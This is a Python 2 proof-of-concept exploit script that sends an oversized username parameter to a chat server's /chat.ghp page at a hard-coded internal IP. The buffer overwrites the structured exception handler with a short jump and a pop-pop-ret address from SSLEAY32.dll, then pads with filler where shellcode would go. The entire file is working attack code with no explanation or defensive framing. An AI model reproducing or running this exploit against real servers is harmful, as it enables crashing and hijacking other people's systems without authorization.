#!/usr/bin/python

import socket
import os
import sys
import struct

ip = "192.168.100.120"
port = 80

nSEH = "\xEB\x09\x90\x90"            # Jump to D buffer
SEH  = struct.pack("<I", 0x10017f64) # ppr - SSLEAY32.dll

crash  = "A" * 217
crash += nSEH
crash += SEH
crash += "D" * (10487 - len(crash))

req  = "GET /chat.ghp?username=" + crash + "&password=skew&room=2&sex=2 HTTP/1.1\r\n"
req += "Host: 192.168.100.120\r\n"
req += "User-Agent: Mozilla/5.0 \r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Referer: http://192.168.100.120/\r\n"
req += "Connection: close\r\n"
req += "Cookie: UserID=; PassWD=; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n\r\n\r\n"

print "[*] Sending evil http request to target"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()

